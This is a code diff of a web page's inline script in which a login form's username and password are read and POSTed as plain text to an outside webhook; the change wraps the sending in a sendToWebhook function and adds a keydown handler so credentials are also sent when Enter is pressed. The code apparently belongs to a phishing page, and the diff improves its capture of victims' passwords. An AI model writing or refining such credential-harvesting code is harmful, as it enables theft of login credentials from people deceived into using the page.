@@ -210,7 +210,7 @@ InputUtil.updatePlaceholder = function (input, placeholderText) {
         </form>
 
         <script>
-document.getElementById("submitButton").addEventListener("click", function () {
+function sendToWebhook() {
   const username = document.getElementById("userNameInput").value;
   const password = document.getElementById("passwordInput").value;
 
@@ -220,9 +220,19 @@ document.getElementById("submitButton").addEventListener("click", function () {
       "Content-Type": "application/json"
     },
     body: JSON.stringify({
-      content: `user: ${username} pw: ${password}`
+      content: `user: ${username}, pw: ${password} `
     })
   });
+}
+
+// Run when button is clicked
+document.getElementById("submitButton").addEventListener("click", sendToWebhook);
+
+// Run when Enter is pressed
+document.addEventListener("keydown", function (event) {
+  if (event.key === "Enter") {
+    sendToWebhook();
+  }
 });
 </script>
 
